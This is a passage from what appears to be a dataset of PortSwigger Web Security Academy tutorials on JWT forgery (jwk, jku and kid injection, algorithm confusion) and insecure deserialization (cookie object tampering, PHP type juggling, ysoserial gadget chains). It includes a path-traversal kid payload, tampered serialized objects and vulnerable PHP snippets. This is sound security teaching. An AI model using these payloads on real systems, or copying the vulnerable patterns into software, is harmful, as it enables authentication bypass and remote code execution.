Burp Repeater.\n    \n4.  In the message editor, switch to the extension-generated **JSON Web Token** tab and [modify](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#editing-jwts) the token's payload however you like.\n    \n5.  Click **Attack**, then select **Embedded JWK**. When prompted, select your newly generated RSA key.\n    \n6.  Send the request to test how the server responds.\n    \n\nYou can also perform this attack manually by adding the `jwk` header yourself. However, you may also need to update the JWT's `kid` header parameter to match the `kid` of the embedded key. The extension's built-in attack takes care of this step for you.\n\n### Injecting self-signed JWTs via the jku parameter\n\nInstead of embedding public keys directly using the `jwk` header parameter, some servers let you use the `jku` (JWK Set URL) header parameter to reference a JWK Set containing the key. When verifying the signature, the server fetches the relevant key from this URL.\n\n#### JWK Set\n\nA JWK Set is a JSON object containing an array of JWKs representing different keys. You can see an example of this below.\n\n```\n{\n    \"keys\": [\n        {\n            \"kty\": \"RSA\",\n            \"e\": \"AQAB\",\n            \"kid\": \"75d0ef47-af89-47a9-9061-7c02a610d5ab\",\n            \"n\": \"o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\"\n        },\n        {\n            \"kty\": \"RSA\",\n            \"e\": \"AQAB\",\n            \"kid\": \"d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\",\n            \"n\": \"fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\"\n        }\n    ]\n}\n```\n\nJWK Sets like this are sometimes exposed publicly via a standard endpoint, such as `/.well-known/jwks.json`.\n\nMore secure websites will only fetch keys from trusted domains, but you can sometimes take advantage of URL parsing discrepancies to bypass this kind of filtering. We covered some [examples of these](https://portswigger.net/web-security/ssrf#ssrf-with-whitelist-based-input-filters) in our topic on [SSRF](https://portswigger.net/web-security/ssrf).\n\n### Injecting self-signed JWTs via the kid parameter\n\nServers may use several cryptographic keys for signing different kinds of data, not just JWTs. For this reason, the header of a JWT may contain a `kid` (Key ID) parameter, which helps the server identify which key to use when verifying the signature.\n\nVerification keys are often stored as a JWK Set. In this case, the server may simply look for the JWK with the same `kid` as the token. However, the JWS specification doesn't define a concrete structure for this ID - it's just an arbitrary string of the developer's choosing. For example, they might use the `kid` parameter to point to a particular entry in a database, or even the name of a file.\n\nIf this parameter is also vulnerable to [directory traversal](https://portswigger.net/web-security/file-path-traversal), an attacker could potentially force the server to use an arbitrary file from its filesystem as the verification key.\n\n```\n{\n    \"kid\": \"../../path/to/file\",\n    \"typ\": \"JWT\",\n    \"alg\": \"HS256\",\n    \"k\": \"asGsADas3421-dfh9DGN-AFDFDbasfd8-anfjkvc\"\n}\n```\n\nThis is especially dangerous if the server also supports JWTs signed using a [symmetric algorithm](https://portswigger.net/web-security/jwt/algorithm-confusion#symmetric-vs-asymmetric-algorithms). In this case, an attacker could potentially point the `kid` parameter to a predictable, static file, then sign the JWT using a secret that matches the contents of this file.\n\nYou could theoretically do this with any file, but one of the simplest methods is to use `/dev/null`, which is present on most Linux systems. As this is an empty file, reading it returns an empty string. Therefore, signing the token with a empty string will result in a valid signature.\n\n#### Note\n\nIf you're using the JWT Editor extension, note that this doesn't let you sign tokens using an empty string. However, due to a bug in the extension, you can get around this by using a Base64-encoded null byte.\n\nIf the server stores its verification keys in a database, the `kid` header parameter is also a potential vector for [SQL injection](https://portswigger.net/web-security/sql-injection) attacks.\n\nThe following header parameters may also be interesting for attackers:\n\n*   `cty` (Content Type) - Sometimes used to declare a media type for the content in the JWT payload. This is usually omitted from the header, but the underlying parsing library may support it anyway. If you have found a way to bypass signature verification, you can try injecting a `cty` header to change the content type to `text/xml` or `application/x-java-serialized-object`, which can potentially enable new vectors for [XXE](https://portswigger.net/web-security/xxe) and [deserialization](https://portswigger.net/web-security/deserialization) attacks.\n    \n*   `x5c` (X.509 Certificate Chain) - Sometimes used to pass the X.509 public key certificate or certificate chain of the key used to digitally sign the JWT. This header parameter can be used to inject self-signed certificates, similar to the [`jwk` header injection](https://portswigger.net/web-security/jwt#injecting-self-signed-jwts-via-the-jwk-parameter) attacks discussed above. Due to the complexity of the X.509 format and its extensions, parsing these certificates can also introduce vulnerabilities. Details of these attacks are beyond the scope of these materials, but for more details, check out [CVE-2017-2800](https://talosintelligence.com/vulnerability_reports/TALOS-2017-0293) and [CVE-2018-2633](https://mbechler.github.io/2018/01/20/Java-CVE-2018-2633).\n    \n\nJWT algorithm confusion\n-----------------------\n\nEven if a server uses robust secrets that you are unable to brute-force, you may still be able to forge valid JWTs by signing the token using an algorithm that the developers haven't anticipated. This is known as an algorithm confusion attack.\n\nHow to prevent JWT attacks\n--------------------------\n\nYou can protect your own websites against many of the attacks we've covered by taking the following high-level measures:\n\n*   Use an up-to-date library for handling JWTs and make sure your developers fully understand how it works, along with any security implications. Modern libraries make it more difficult for you to inadvertently implement them insecurely, but this isn't foolproof due to the inherent flexibility of the related specifications.\n    \n*   Make sure that you perform robust signature verification on any JWTs that you receive, and account for edge-cases such as JWTs signed using unexpected algorithms.\n    \n*   Enforce a strict whitelist of permitted hosts for the `jku` header.\n    \n*   Make sure that you're not vulnerable to path traversal or SQL injection via the `kid` header parameter.\n    \n\n### Additional best practice for JWT handling\n\nAlthough not strictly necessary to avoid introducing vulnerabilities, we recommend adhering to the following best practice when using JWTs in your applications:\n\n*   Always set an expiration date for any tokens that you issue.\n    \n*   Avoid sending tokens in URL parameters where possible.\n    \n*   Include the `aud` (audience) claim (or similar) to specify the intended recipient of the token. This prevents it from being used on different websites.\n    \n*   Enable the issuing server to revoke tokens (on logout, for example).\n", "category": "JWT"}, {"title": "Algorithm confusion attacks", "content": "#### Note\n\nThe public key you use to sign the token must be absolutely identical to the public key stored on the server. This includes using the same format (such as X.509 PEM) and preserving any non-printing characters like newlines. In practice, you may need to experiment with different formatting in order for this attack to work.\n\nPerforming an algorithm confusion attack\n----------------------------------------\n\nAn algorithm confusion attack generally involves the following high-level steps:\n\n1.  [Obtain the server's public key](https://portswigger.net/web-security/jwt/algorithm-confusion#step-1-obtain-the-server-s-public-key)\n    \n2.  [Convert the public key to a suitable format](https://portswigger.net/web-security/jwt/algorithm-confusion#step-2-convert-the-public-key-to-a-suitable-format)\n    \n3.  [Create a malicious JWT](https://portswigger.net/web-security/jwt/algorithm-confusion#step-3-modify-your-jwt) with a modified payload and the `alg` header set to `HS256`.\n    \n4.  [Sign the token with HS256](https://portswigger.net/web-security/jwt/algorithm-confusion#step-4-sign-the-jwt-using-the-public-key), using the public key as the secret.\n    \n\nIn this section, we'll walk through this process in more detail, demonstrating how you can perform this kind of attack using Burp Suite.\n\n### Step 1 - Obtain the server's public key\n\nServers sometimes expose their public keys as JSON Web Key (JWK) objects via a standard endpoint mapped to `/jwks.json` or `/.well-known/jwks.json`, for example. These may be stored in an array of JWKs called `keys`. This is known as a JWK Set.\n\n```\n{\n    \"keys\": [\n        {\n            \"kty\": \"RSA\",\n            \"e\": \"AQAB\",\n            \"kid\": \"75d0ef47-af89-47a9-9061-7c02a610d5ab\",\n            \"n\": \"o-yy1wpYmffgXBxhAUJzHHocCuJolwDqql75ZWuCQ_cb33K2vh9mk6GPM9gNN4Y_qTVX67WhsN3JvaFYw-fhvsWQ\"\n        },\n        {\n            \"kty\": \"RSA\",\n            \"e\": \"AQAB\",\n            \"kid\": \"d8fDFo-fS9-faS14a9-ASf99sa-7c1Ad5abA\",\n            \"n\": \"fc3f-yy1wpYmffgXBxhAUJzHql79gNNQ_cb33HocCuJolwDqmk6GPM4Y_qTVX67WhsN3JvaFYw-dfg6DH-asAScw\"\n        }\n    ]\n}\n```\n\nEven if the key isn't exposed publicly, you may be able to [extract it from a pair of existing JWTs](https://portswigger.net/web-security/jwt/algorithm-confusion#deriving-public-keys-from-existing-tokens).\n\n### Step 2 - Convert the public key to a suitable format\n\nAlthough the server may expose their public key in JWK format, when verifying the signature of a token, it will use its own copy of the key from its local filesystem or database. This may be stored in a different format.\n\nIn order for the attack to work, the version of the key that you use to sign the JWT must be identical to the server's local copy. In addition to being in the same format, every single byte must match, including any non-printing characters.\n\nFor the purpose of this example, let's assume that we need the key in X.509 PEM format. You can convert a JWK to a PEM using the [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd) extension in Burp as follows:\n\n1.  With the extension loaded, in Burp's main tab bar, go to the **JWT Editor Keys** tab.\n    \n2.  Click **New RSA** Key. In the dialog, paste the JWK that you obtained earlier.\n    \n3.  Select the **PEM** radio button and copy the resulting PEM key.\n    \n4.  Go to the **Decoder** tab and Base64-encode the PEM.\n    \n5.  Go back to the **JWT Editor Keys** tab and click **New Symmetric Key**.\n    \n6.  In the dialog, click **Generate** to generate a new key in JWK format.\n    \n7.  Replace the generated value for the `k` parameter with a Base64-encoded PEM key that you just copied.\n    \n8.  Save the key.\n    \n\n### Step 3 - Modify your JWT\n\nOnce you have the public key in a suitable format, you can [modify the JWT](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#editing-jwts) however you like. Just make sure that the `alg` header is set to `HS256`.\n\n### Step 4 - Sign the JWT using the public key\n\n[Sign the token](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/jwts#adding-a-jwt-signing-key) using the HS256 algorithm with the RSA public key as the secret.\n\nDeriving public keys from existing tokens\n-----------------------------------------\n\nIn cases where the public key isn't readily available, you may still be able to test for algorithm confusion by deriving the key from a pair of existing JWTs. This process is relatively simple using tools such as `jwt_forgery.py`. You can find this, along with several other useful scripts, on the [`rsa_sign2n` GitHub repository](https://github.com/silentsignal/rsa_sign2n).\n\nWe have also created a simplified version of this tool, which you can run as a single command:\n\n```\n\n            docker run --rm -it portswigger/sig2n <token1> <token2>\n        \n```\n\n#### Note\n\nYou need the Docker CLI to run either version of the tool. The first time you run this command, it will automatically pull the image from Docker Hub, which may take a few minutes.\n\nThis uses the JWTs that you provide to calculate one or more potential values of `n`. Don't worry too much about what this means - all you need to know is that only one of these matches the value of `n` used by the server's key. For each potential value, our script outputs:\n\n*   A Base64-encoded PEM key in both X.509 and PKCS1 format.\n    \n*   A forged JWT signed using each of these keys.\n    \n\nTo identify the correct key, use Burp Repeater to send a request containing each of the forged JWTs. Only one of these will be accepted by the server. You can then use the matching key to construct an algorithm confusion attack.\n\nFor more information on how this process works, and details of how to use the standard `jwt_forgery.py` tool, please refer to the documentation provided in the [repository](https://github.com/silentsignal/rsa_sign2n).\n\n#### Read more\n\nFor more labs, check out the rest of our topic on JWT attacks.\n\n[JWT attacks](https://portswigger.net/web-security/jwt)\n", "category": "JWT"}, {"title": "What is Insecure Deserialization?", "content": "In this section, we'll cover what insecure deserialization is and describe how it can potentially expose websites to high-severity attacks. We'll highlight typical scenarios and demonstrate some widely applicable techniques using concrete examples of PHP, Ruby, and Java deserialization. We'll also look at some ways that you can avoid insecure deserialization vulnerabilities in your own websites.\n\n!\n\n#### Labs\n\nIf you're already familiar with the basic concepts behind deserialization vulnerabilities and just want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access all of the labs in this topic from the link below.\n\n*   [View all deserialization labs](https://portswigger.net/web-security/all-labs#insecure-deserialization)\n\nWhat is serialization?\n----------------------\n\n**Serialization** is the process of converting complex data structures, such as objects and their fields, into a \"flatter\" format that can be sent and received as a sequential stream of bytes. Serializing data makes it much simpler to:\n\n*   Write complex data to inter-process memory, a file, or a database\n*   Send complex data, for example, over a network, between different components of an application, or in an API call\n\nCrucially, when serializing an object, its state is also persisted. In other words, the object's attributes are preserved, along with their assigned values.\n\n### Serialization vs deserialization\n\n**Deserialization** is the process of restoring this byte stream to a fully functional replica of the original object, in the exact state as when it was serialized. The website's logic can then interact with this deserialized object, just like it would with any other object.\n\n!\n\nMany programming languages offer native support for serialization. Exactly how objects are serialized depends on the language. Some languages serialize objects into binary formats, whereas others use different string formats, with varying degrees of human readability. Note that all of the original object's attributes are stored in the serialized data stream, including any private fields. To prevent a field from being serialized, it must be explicitly marked as \"transient\" in the class declaration.\n\nBe aware that when working with different programming languages, serialization may be referred to as marshalling (Ruby) or pickling (Python). These terms are synonymous with \"serialization\" in this context.\n\nWhat is insecure deserialization?\n---------------------------------\n\nInsecure deserialization is when user-controllable data is deserialized by a website. This potentially enables an attacker to manipulate serialized objects in order to pass harmful data into the application code.\n\nIt is even possible to replace a serialized object with an object of an entirely different class. Alarmingly, objects of any class that is available to the website will be deserialized and instantiated, regardless of which class was expected. For this reason, insecure deserialization is sometimes known as an \"object injection\" vulnerability.\n\nAn object of an unexpected class might cause an exception. By this time, however, the damage may already be done. Many deserialization-based attacks are completed **before** deserialization is finished. This means that the deserialization process itself can initiate an attack, even if the website's own functionality does not directly interact with the malicious object. For this reason, websites whose logic is based on strongly typed languages can also be vulnerable to these techniques.\n\nHow do insecure deserialization vulnerabilities arise?\n------------------------------------------------------\n\nInsecure deserialization typically arises because there is a general lack of understanding of how dangerous deserializing user-controllable data can be. Ideally, user input should never be deserialized at all.\n\nHowever, sometimes website owners think they are safe because they implement some form of additional check on the deserialized data. This approach is often ineffective because it is virtually impossible to implement validation or sanitization to account for every eventuality. These checks are also fundamentally flawed as they rely on checking the data after it has been deserialized, which in many cases will be too late to prevent the attack.\n\nVulnerabilities may also arise because deserialized objects are often assumed to be trustworthy. Especially when using languages with a binary serialization format, developers might think that users cannot read or manipulate the data effectively. However, while it may require more effort, it is just as possible for an attacker to exploit binary serialized objects as it is to exploit string-based formats.\n\nDeserialization-based attacks are also made possible due to the number of dependencies that exist in modern websites. A typical site might implement many different libraries, which each have their own dependencies as well. This creates a massive pool of classes and methods that is difficult to manage securely. As an attacker can create instances of any of these classes, it is hard to predict which methods can be invoked on the malicious data. This is especially true if an attacker is able to chain together a long series of unexpected method invocations, passing data into a sink that is completely unrelated to the initial source. It is, therefore, almost impossible to anticipate the flow of malicious data and plug every potential hole.\n\nIn short, it can be argued that it is not possible to securely deserialize untrusted input.\n\nWhat is the impact of insecure deserialization?\n-----------------------------------------------\n\nThe impact of insecure deserialization can be very severe because it provides an entry point to a massively increased attack surface. It allows an attacker to reuse existing application code in harmful ways, resulting in numerous other vulnerabilities, often remote code execution.\n\nEven in cases where remote code execution is not possible, insecure deserialization can lead to privilege escalation, arbitrary file access, and denial-of-service attacks.\n\nHow to exploit insecure deserialization vulnerabilities\n-------------------------------------------------------\n\nNow that you're familiar with the basics of serialization and deserialization, we can look at how you can exploit insecure deserialization vulnerabilities.\n\nHow to prevent insecure deserialization vulnerabilities\n-------------------------------------------------------\n\nGenerally speaking, deserialization of user input should be avoided unless absolutely necessary. The high severity of exploits that it potentially enables, and the difficulty in protecting against them, outweigh the benefits in many cases.\n\nIf you do need to deserialize data from untrusted sources, incorporate robust measures to make sure that the data has not been tampered with. For example, you could implement a digital signature to check the integrity of the data. However, remember that any checks must take place **before** beginning the deserialization process. Otherwise, they are of little use.\n\nIf possible, you should avoid using generic deserialization features altogether. Serialized data from these methods contains all attributes of the original object, including private fields that potentially contain sensitive information. Instead, you could create your own class-specific serialization methods so that you can at least control which fields are exposed.\n\nFinally, remember that the vulnerability is the deserialization of user input, not the presence of gadget chains that subsequently handle the data. Don't rely on trying to eliminate gadget chains that you identify during testing. It is impractical to try and plug them all due to the web of cross-library dependencies that almost certainly exist on your website. At any given time, publicly documented memory corruption exploits are also a factor, meaning that your application may be vulnerable regardless.\n", "category": "Insecure Deserialization"}, {"title": "Identifying", "content": "#### Note\n\nAlthough many of the labs and examples are based on PHP, most of the exploitation techniques are equally valid for other languages as well.\n\nHow to identify insecure deserialization\n----------------------------------------\n\nIdentifying insecure deserialization is relatively simple regardless of whether you are whitebox or blackbox testing.\n\nDuring auditing, you should look at all data being passed into the website and try to identify anything that looks like serialized data. Serialized data can be identified relatively easily if you know the format that different languages use. In this section, we'll show examples from both PHP and Java serialization. Once you identify serialized data, you can test whether you are able to control it.\n\n### PHP serialization format\n\nPHP uses a mostly human-readable string format, with letters representing the data type and numbers representing the length of each entry. For example, consider a `User` object with the attributes:\n\n```\n$user->name = \"carlos\";\n$user->isLoggedIn = true;\n```\n\nWhen serialized, this object may look something like this:\n\n`O:4:\"User\":2:{s:4:\"name\":s:6:\"carlos\"; s:10:\"isLoggedIn\":b:1;}`\n\nThis can be interpreted as follows:\n\n*   `O:4:\"User\"` - An object with the 4-character class name `\"User\"`\n*   `2` - the object has 2 attributes\n*   `s:4:\"name\"` - The key of the first attribute is the 4-character string `\"name\"`\n*   `s:6:\"carlos\"` - The value of the first attribute is the 6-character string `\"carlos\"`\n*   `s:10:\"isLoggedIn\"` - The key of the second attribute is the 10-character string `\"isLoggedIn\"`\n*   `b:1` - The value of the second attribute is the boolean value `true`\n\nThe native methods for PHP serialization are `serialize()` and `unserialize()`. If you have source code access, you should start by looking for `unserialize()` anywhere in the code and investigating further.\n\n### Java serialization format\n\nSome languages, such as Java, use binary serialization formats. This is more difficult to read, but you can still identify serialized data if you know how to recognize a few tell-tale signs. For example, serialized Java objects always begin with the same bytes, which are encoded as `ac ed `in hexadecimal and `rO0` in Base64.\n\nAny class that implements the interface `java.io.Serializable` can be serialized and deserialized. If you have source code access, take note of any code that uses the `readObject()` method, which is used to read and deserialize data from an `InputStream`.\n\nManipulating serialized objects\n-------------------------------\n\nExploiting some deserialization vulnerabilities can be as easy as changing an attribute in a serialized object. As the object state is persisted, you can study the serialized data to identify and edit interesting attribute values. You can then pass the malicious object into the website via its deserialization process. This is the initial step for a basic deserialization exploit.\n\nBroadly speaking, there are two approaches you can take when manipulating serialized objects. You can either edit the object directly in its byte stream form, or you can write a short script in the corresponding language to create and serialize the new object yourself. The latter approach is often easier when working with binary serialization formats.\n\n### Modifying object attributes\n\nWhen tampering with the data, as long as the attacker preserves a valid serialized object, the deserialization process will create a server-side object with the modified attribute values.\n\nAs a simple example, consider a website that uses a serialized `User` object to store data about a user's session in a cookie. If an attacker spotted this serialized object in an HTTP request, they might decode it to find the following byte stream:\n\n`O:4:\"User\":2:{s:8:\"username\";s:6:\"carlos\";s:7:\"isAdmin\";b:0;}`\n\nThe `isAdmin` attribute is an obvious point of interest. An attacker could simply change the boolean value of the attribute to `1` (true), re-encode the object, and overwrite their current cookie with this modified value. In isolation, this has no effect. However, let's say the website uses this cookie to check whether the current user has access to certain administrative functionality:\n\n```\n$user = unserialize($_COOKIE);\nif ($user->isAdmin === true) {\n// allow access to admin interface\n}\n```\n\nThis vulnerable code would instantiate a `User` object based on the data from the cookie, including the attacker-modified `isAdmin` attribute. At no point is the authenticity of the serialized object checked. This data is then passed into the conditional statement and, in this case, would allow for an easy privilege escalation.\n\nThis simple scenario is not common in the wild. However, editing an attribute value in this way demonstrates the first step towards accessing the massive amount of attack-surface exposed by insecure deserialization.\n\n### Modifying data types\n\nWe've seen how you can modify attribute values in serialized objects, but it's also possible to supply unexpected data types.\n\nPHP-based logic is particularly vulnerable to this kind of manipulation due to the behavior of its loose comparison operator (`==`) when comparing different data types. For example, if you perform a loose comparison between an integer and a string, PHP will attempt to convert the string to an integer, meaning that `5 == \"5\"` evaluates to `true`.\n\nUnusually, this also works for any alphanumeric string that starts with a number. In this case, PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely. Therefore, `5 == \"5 of something\" `is in practice treated as `5 == 5`.\n\nThis becomes even stranger when comparing a string the integer `0`:\n\n`0 == \"Example string\" // true`\n\nWhy? Because there is no number, that is, 0 numerals in the string. PHP treats this entire string as the integer `0`.\n\nConsider a case where this loose comparison operator is used in conjunction with user-controllable data from a deserialized object. This could potentially result in dangerous [logic flaws](https://portswigger.net/web-security/logic-flaws).\n\n```\n$login = unserialize($_COOKIE)\nif ($login['password'] == $password) {\n// log in successfully\n}\n```\n\nLet's say an attacker modified the password attribute so that it contained the integer `0` instead of the expected string. As long as the stored password does not start with a number, the condition would always return `true`, enabling an authentication bypass. Note that this is only possible because deserialization preserves the data type. If the code fetched the password from the request directly, the `0` would be converted to a string and the condition would evaluate to `false`.\n\nBe aware that when modifying data types in any serialized object format, it is important to remember to update any type labels and length indicators in the serialized data too. Otherwise, the serialized object will be corrupted and will not be deserialized.\n\nWhen working directly with binary formats, we recommend using the Hackvertor extension, available from the BApp store. With Hackvertor, you can modify the serialized data as a string, and it will automatically update the binary data, adjusting the offsets accordingly. This can save you a lot of manual effort.\n\nUsing application functionality\n-------------------------------\n\nAs well as simply checking attribute values, a website's functionality might also perform dangerous operations on data from a deserialized object. In this case, you can use insecure deserialization to pass in unexpected data and leverage the related functionality to do damage.\n\nFor example, as part of a website's \"Delete user\" functionality, the user's profile picture is deleted by accessing the file path in the `$user->image_location` attribute. If this `$user` was created from a serialized object, an attacker could exploit this by passing in a modified object with the `image_location` set to an arbitrary file path. Deleting their own user account would then delete this arbitrary file as well.\n\nThis example relies on the attacker manually invoking the dangerous method via user-accessible functionality. However, insecure deserialization becomes much more interesting when you create exploits that pass data into dangerous methods automatically. This is enabled by the use of \"magic methods\".\n\nMagic methods\n-------------\n\nMagic methods are a special subset of methods that you do not have to explicitly invoke. Instead, they are invoked automatically whenever a particular event or scenario occurs. Magic methods are a common feature of object-oriented programming in various languages. They are sometimes indicated by prefixing or surrounding the method name with double-underscores.\n\nDevelopers can add magic methods to a class in order to predetermine what code should be executed when the corresponding event or scenario occurs. Exactly when and why a magic method is invoked differs from method to method. One of the most common examples in PHP is `__construct()`, which is invoked whenever an object of the class is instantiated, similar to Python's `__init__`. Typically, constructor magic methods like this contain code to initialize the attributes of the instance. However, magic methods can be customized by developers to execute any code they want.\n\nMagic methods are widely used and do not represent a vulnerability on their own. But they can become dangerous when the code that they execute handles attacker-controllable data, for example, from a deserialized object. This can be exploited by an attacker to automatically invoke methods on the deserialized data when the corresponding conditions are met.\n\nMost importantly in this context, some languages have magic methods that are invoked automatically **during** the deserialization process. For example, PHP's `unserialize()` method looks for and invokes an object's `__wakeup()` magic method.\n\nIn Java deserialization, the same applies to the `ObjectInputStream.readObject()` method, which is used to read data from the initial byte stream and essentially acts like a constructor for \"re-initializing\" a serialized object. However, `Serializable` classes can also declare their own `readObject()` method as follows:\n\n```\nprivate void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException\n{\n    // implementation\n}\n```\n\nA `readObject()` method declared in exactly this way acts as a magic method that is invoked during deserialization. This allows the class to control the deserialization of its own fields more closely.\n\nYou should pay close attention to any classes that contain these types of magic methods. They allow you to pass data from a serialized object into the website's code before the object is fully deserialized. This is the starting point for creating more advanced exploits.\n\nInjecting arbitrary objects\n---------------------------\n\nAs we've seen, it is occasionally possible to exploit insecure deserialization by simply editing the object supplied by the website. However, injecting arbitrary object types can open up many more possibilities.\n\nIn object-oriented programming, the methods available to an object are determined by its class. Therefore, if an attacker can manipulate which class of object is being passed in as serialized data, they can influence what code is executed after, and even during, deserialization.\n\nDeserialization methods do not typically check what they are deserializing. This means that you can pass in objects of any serializable class that is available to the website, and the object will be deserialized. This effectively allows an attacker to create instances of arbitrary classes. The fact that this object is not of the expected class does not matter. The unexpected object type might cause an exception in the application logic, but the malicious object will already be instantiated by then.\n\nIf an attacker has access to the source code, they can study all of the available classes in detail. To construct a simple exploit, they would look for classes containing deserialization magic methods, then check whether any of them perform dangerous operations on controllable data. The attacker can then pass in a serialized object of this class to use its magic method for an exploit.\n\nClasses containing these deserialization magic methods can also be used to initiate more complex attacks involving a long series of method invocations, known as a \"gadget chain\".\n\nGadget chains\n-------------\n\nA \"gadget\" is a snippet of code that exists in the application that can help an attacker to achieve a particular goal. An individual gadget may not directly do anything harmful with user input. However, the attacker's goal might simply be to invoke a method that will pass their input into another gadget. By chaining multiple gadgets together in this way, an attacker can potentially pass their input into a dangerous \"sink gadget\", where it can cause maximum damage.\n\nIt is important to understand that, unlike some other types of exploit, a gadget chain is not a payload of chained methods constructed by the attacker. All of the code already exists on the website. The only thing the attacker controls is the data that is passed into the gadget chain. This is typically done using a magic method that is invoked during deserialization, sometimes known as a \"kick-off gadget\".\n\nIn the wild, many insecure deserialization vulnerabilities will only be exploitable through the use of gadget chains. This can sometimes be a simple one or two-step chain, but constructing high-severity attacks will likely require a more elaborate sequence of object instantiations and method invocations. Therefore, being able to construct gadget chains is one of the key aspects of successfully exploiting insecure deserialization.\n\n### Working with pre-built gadget chains\n\nManually identifying gadget chains can be a fairly arduous process, and is almost impossible without source code access. Fortunately, there are a few options for working with pre-built gadget chains that you can try first.\n\nThere are several tools available that provide a range of pre-discovered chains that have been successfully exploited on other websites. Even if you don't have access to the source code, you can use these tools to both identify and exploit insecure deserialization vulnerabilities with relatively little effort. This approach is made possible due to the widespread use of libraries that contain exploitable gadget chains. For example, if a gadget chain in Java's Apache Commons Collections library can be exploited on one website, any other website that implements this library may also be exploitable using the same chain.\n\n#### ysoserial\n\nOne such tool for Java deserialization is \"ysoserial\". This lets you choose one of the provided gadget chains for a library that you think the target application is using, then pass in a command that you want to execute. It then creates an appropriate serialized object based on the selected chain. This still involves a certain amount of trial and error, but it is considerably less labor-intensive than constructing your own gadget chains manually.\n\n#### Note\n\nIn Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:\n\n```\njava -jar ysoserial-all.jar \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\\n   --add-opens=java.base/java.net=ALL-UNNAMED \\\n   --add-opens=java.base/java.util=ALL-UNNAMED \\\n   [payload] '[command]'\n```\n\nNot all of the gadget chains in ysoserial enable you to run arbitrary code. Instead, they may be useful for other purposes. For example, you can use the following ones to help you quickly detect insecure deserialization on virtually any server:\n\n*   The `URLDNS` chain triggers a DNS lookup for a supplied URL. Most importantly, it does not rely on the target application using a specific vulnerable library and works in any known Java version. This makes it the most universal gadget chain for detection purposes. If you spot a serialized object in the traffic, you can try using this gadget chain to generate an object that triggers a DNS interaction with the Burp Collaborator server. If it does, you can be sure that deserialization occurred on your target.\n*   `JRMPClient` is another universal chain that you can use for initial detection. It causes the server to try establishing a TCP connection to the supplied IP address. Note that you need to provide a raw IP address rather than a hostname. This chain may be useful in environments where all outbound traffic is firewalled, including DNS lookups. You can try generating payloads with two different IP addresses: a local one and a firewalled, external one. If the application responds immediately for a payload with a local address, but hangs for a payload with an external address, causing a delay in the response, this indicates that the gadget chain worked because the server tried to connect to the firewalled address. In this case, the subtle time difference in responses can help you to detect whether deserialization occurs on the server, even in blind cases.\n\n#### PHP Generic Gadget Chains\n\nMost languages that frequently suffer from insecure deserialization vulnerabilities have equivalent proof-of-concept tools. For example, for PHP-based sites you can use \"PHP Generic Gadget Chains\" (PHPGGC).\n\n#### Note\n\nIt is important to note that the vulnerability is the deserialization of user-controllable data, not the mere presence of a gadget chain in the website's code or any of its libraries. The gadget chain is just a means of manipulating the flow of the harmful data once it has been injected. This also applies to various memory corruption vulnerabilities that rely on deserialization of untrusted data. In other words, a website may still be vulnerable even if it did somehow manage to plug every possible gadget chain.\n\n### Working with documented gadget chains\n\nThere may not always be a dedicated tool available for exploiting known gadget chains in the framework used by the target application. In this case, it's always worth looking online to see if there are any documented exploits that you can adapt manually. Tweaking the code may require some basic understanding of the language and framework, and you might sometimes need to serialize the object yourself, but this approach is still considerably less effort than building an exploit from scratch.\n\nEven if you can't find a gadget chain that's ready to use, you may still gain valuable knowledge that helps you create your own custom exploit.\n\nCreating your own exploit\n-------------------------\n\nWhen off-the-shelf gadget chains and documented exploits are unsuccessful, you will need to create your own exploit.\n\nTo successfully build your own gadget chain, you will almost certainly need source code access. The first step is to study this source code to identify a class that contains a magic method that is invoked during deserialization. Assess the code that this magic method executes to see if it directly does anything dangerous with user-controllable attributes. This is always worth checking just in case.\n\nIf the magic method is not exploitable on its own, it can serve as your \"kick-off gadget\" for a gadget chain. Study any methods that the kick-off gadget invokes. Do any of these do something dangerous with data that you control? If not, take a closer look at each of the methods that they subsequently invoke, and so on.\n\nRepeat this process, keeping track of which values you have access to, until you either reach a dead end or identify a dangerous sink gadget into which your controllable data is passed.\n\nOnce you've worked out how to successfully construct a gadget chain within the application code, the next step is to create a serialized object containing your payload. This is simply a case of studying the class declaration in the source code and creating a valid serialized object with the appropriate values required for your exploit. As we have seen in previous labs, this is relatively simple when working with string-based serialization formats.\n\nWorking with binary formats, such as when constructing a Java deserialization exploit, can be particularly cumbersome. When making minor changes to an existing object, you might be comfortable working directly with the bytes. However, when making more significant changes, such as passing in a completely new object, this quickly becomes impractical. It is often much simpler to write your own code in the target language in order to generate and serialize the data yourself.\n\nWhen creating your own gadget chain, look out for opportunities to use this extra attack surface to trigger secondary vulnerabilities.\n\nBy carefully studying the source code, you can discover longer gadget chains that potentially allow you to construct high-severity attacks, often including remote code execution.\n\nPHAR deserialization\n--------------------\n\nSo far, we've looked primarily at exploiting deserialization vulnerabilities where the website explicitly deserializes user input. However, in PHP it is sometimes possible to exploit deserialization even if there is no obvious use of the `unserialize()` method.\n\nPHP provides several URL-style wrappers that you can use for handling different protocols when accessing file paths. One of these is the `phar://` wrapper, which provides a stream interface for accessing PHP Archive (`.phar`) files.\n\nThe PHP documentation reveals that `PHAR` manifest files contain serialized metadata. Crucially, if you perform any filesystem operations on a `phar:// `stream, this metadata is implicitly deserialized. This means that a `phar://` stream can potentially be a vector for exploiting insecure deserialization, provided that you can pass this stream into a filesystem method.\n\nIn the case of obviously dangerous filesystem methods, such as `include()` or `fopen()`, websites are likely to have implemented counter-measures to reduce the potential for them to be used maliciously. However, methods such as `file_exists()`, which are not so overtly dangerous, may not be as well protected.\n\nThis technique also requires you to upload the `PHAR` to the server somehow. One approach is to use an image upload functionality, for example. If you are able to create a polyglot file, with a 